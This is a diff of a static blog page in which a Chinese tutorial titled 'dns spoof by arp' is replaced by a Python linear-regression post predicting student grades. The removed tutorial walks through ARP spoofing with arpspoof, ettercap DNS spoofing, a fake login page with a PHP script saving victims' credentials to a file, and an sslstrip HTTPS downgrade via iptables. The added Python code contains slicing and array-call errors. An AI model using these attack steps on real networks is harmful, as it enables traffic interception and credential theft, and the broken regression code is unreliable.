@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="dns spoof by arp, Y1ng0&#39;s blog">
+    <meta name="keywords" content="人工智能之数据模型建造-预测成绩, Y1ng0&#39;s blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>dns spoof by arp | Y1ng0&#39;s blog</title>
+    <title>人工智能之数据模型建造-预测成绩 | Y1ng0&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -222,12 +222,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">dns spoof by arp</h1>
+                    <h1 class="description center-align post-title">人工智能之数据模型建造-预测成绩</h1>
                 </div>
             </div>
         </div>
@@ -351,8 +351,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/kali/" class="post-category">
-                                kali
+                            <a href="/categories/python/" class="post-category">
+                                python
                             </a>
                         
                     </div>
@@ -385,59 +385,9 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><code>arp: address resolution protocol地址解析协议.</code></p>
-<p>根据ip地址获取物理地址的一个TCP/IP协议 </p>
-<p>原理:<code>同一个局域网内.将自己伪造成网关,从而获得其他主机的流量,进而进行dns欺骗等攻击</code> </p>
-<p>实战分析:</p>
-<p>攻击机: kali虚拟机<img src="/medias/pictures/3.png"></p>
-<p>靶机:<img src="/medias/pictures/4.png">  </p>
-<p>首先扫描局域网内的所有up的主机:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.0.0&#x2F;24</span><br></pre></td></tr></table></figure>
-<p><img src="/medias/pictures/5.png"><br>找到所需靶机 </p>
-<p>首先进行重定向分配:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure>
-
-<p>(查看是否成功:cat /proc/sys/net/ip4/ip_forward 是否为1)<img src="/medias/pictures/6.png"></p>
-<p>如果不分配,流量发送到kali无法到达网关,会使目标断网 </p>
-<p>然后进行arp欺骗</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.0.103 192.168.0.1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/medias/pictures/7.png"><code>-i 选择网卡-t target 选择目标 第一个ip为靶机,第二个ip为局域内的网关</code> </p>
-<p>到此arp欺骗已经成功 </p>
-<p>接下来可以尝试<code>arp攻击中的dns欺骗</code>:</p>
-<p>所用工具:ettercap </p>
-<p>ps:先通过etter.conf选择系统版本:linux,将前面注释去掉<img src="/medias/pictures/8.png"> 配置ettercap中的etter.dns文件(路径: /etc/ettercap/etter.dns)<img src="/medias/pictures/9.png"></p>
-<p>为了防止双重验证可加上反向解析:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*.com PTR 192.168.0.100*.cn PTR 192.168.0.100 </span><br></pre></td></tr></table></figure>
-
-<p>然后打开ettercap(比较懒,用的是图形化界面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -G</span><br></pre></td></tr></table></figure>
-
-<p><img src="/medias/pictures/10.png"></p>
-<p>  进行dns_spoof<img src="/medias/pictures/11.png"> 欺骗后如何获得用户输入的数据呢?</p>
-<p>可以制作动态网站,通过一个php文件打印到txt文档中</p>
-<p><img src="medias/pictures/12.png"></p>
-<p>index.html 是自己制作的假登陆网站 (不要忘记开启代理服务)(kali默认apache2 )</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(命令: systemctl start apache2 或 services apache2 start)(apache主页的默认路径: &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html) </span><br></pre></td></tr></table></figure>
-
-<p><img src="/medias/pictures/13.png"> houtai.php      </p>
-<p>登录网站的数据post到此1.txt                 </p>
-<p>php文件将用户输入的数据打印到此 所用到的php语句:<img src="/medias/pictures/14.png"></p>
-<p>定义一个$pas变量 </p>
-<p>定义一个$content变量</p>
-<p>定义一个$filed变量   </p>
-<p>fopen 打开1.txt    a+将光标移动到最后一行末尾   </p>
-<p>fwrite写入内容 </p>
-<p>ettercap的view视图:</p>
-<p><code>connections</code> 查看被攻击机访问的ip,端口,协议,发送和接收的数据包的大小</p>
-<p><code>profiles</code>  查看被攻击机访问的链接  在下方可以查看更清晰的连接访问连接访问情况也可以通过双击连接来查看</p>
-<p><code>profiles details</code> 即访问网站的具体情况 </p>
-<p>使用sslstrip将https安全级降为http:（安装可以使用git命令）（但会缺少python中的一个twisted模块）（需要使用python2版本的pip下载） </p>
-<p>数据进行重定向</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward </span><br></pre></td></tr></table></figure>
-
-<p>使用iptables把80端口的流量转发到sslstrip监听的8080端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 打开 sslstrip： sslstrip -l 8080sslstrip -a -f -k    </span><br></pre></td></tr></table></figure>
+                <p>思路:通过’scores’的表格数据,搭建前10门课与最后一门Linux操作系统之间关系的模型</p>
+<p>​     然后应用这个模型,预测成绩</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np				<span class="comment">#处理矩阵</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd				<span class="comment">#处理表格数据</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt	 <span class="comment">#数据可视化:plot(折线图)scatter(离散图)</span></span><br><span class="line"></span><br><span class="line">scores = pd.read_csv(<span class="string">&quot;/medias/documents/scores.csv&quot;</span>)		<span class="comment">#打开表格</span></span><br><span class="line">scores.head()											 <span class="comment">#显示前5行</span></span><br><span class="line">scores.tail()											 <span class="comment">#显示后5行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression			<span class="comment">#构建模型</span></span><br><span class="line"></span><br><span class="line">X = np.array(scores.iloc[:,<span class="number">1</span>,-<span class="number">1</span>])						   <span class="comment">#行列切片</span></span><br><span class="line">y_os = np.array(scores.iloc[:,-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#iloc函数:column name too long,不好输入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#构建折线图:x轴为学生序列号,y轴为linux os socres</span></span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="built_in">len</span>(y_os)),y_os,color = <span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Student.NO&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Linux OS socres&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个线性回归对象</span></span><br><span class="line">regressor = LinearRegression()</span><br><span class="line">y_os = y_os.reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#模型训练</span></span><br><span class="line">regressor.fit(X,y_os)</span><br><span class="line"></span><br><span class="line"><span class="comment">#模型测试</span></span><br><span class="line">X_sample = np.array[[<span class="number">80</span>,<span class="number">80</span>,<span class="number">80</span>,<span class="number">80</span>,<span class="number">80</span>,<span class="number">80</span>,<span class="number">80</span>,<span class="number">80</span>,<span class="number">80</span>,<span class="number">80</span>]]</span><br><span class="line">y_predict = regressor.predict(X_sample)</span><br><span class="line"><span class="built_in">print</span>(y_predict)</span><br></pre></td></tr></table></figure>
 
 
                 
@@ -465,7 +415,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/04/01/arp%20address%20resolution%20protocol%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE/">http://example.com/2021/04/01/arp%20address%20resolution%20protocol%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE/</a>
+                    <a href="http://example.com/2021/04/01/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B%E5%BB%BA%E9%80%A0-%E9%A2%84%E6%B5%8B%E6%88%90%E7%BB%A9/">http://example.com/2021/04/01/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B%E5%BB%BA%E9%80%A0-%E9%A2%84%E6%B5%8B%E6%88%90%E7%BB%A9/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -672,9 +622,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
                 <a href="/2021/04/01/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%B9%8B%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B%E5%BB%BA%E9%80%A0-%E9%A2%84%E6%B5%8B%E6%88%90%E7%BB%A9/">
                     <div class="card-image">
@@ -692,9 +643,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-01
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -707,6 +658,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -717,13 +669,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/03/31/py%E8%8E%B7%E5%8F%96%E5%A4%A9%E6%B0%94%E4%BF%A1%E6%81%AF%20%20By%20%E7%88%AC%E8%99%AB/">
+                <a href="/2021/04/01/arp%20address%20resolution%20protocol%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="获取天气信息  By 爬虫">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="dns spoof by arp">
                         
-                        <span class="card-title">获取天气信息  By 爬虫</span>
+                        <span class="card-title">dns spoof by arp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -734,14 +686,14 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-31
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-01
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/python/" class="post-category">
-                                    python
+                            <a href="/categories/kali/" class="post-category">
+                                    kali
                                 </a>
                             
                             
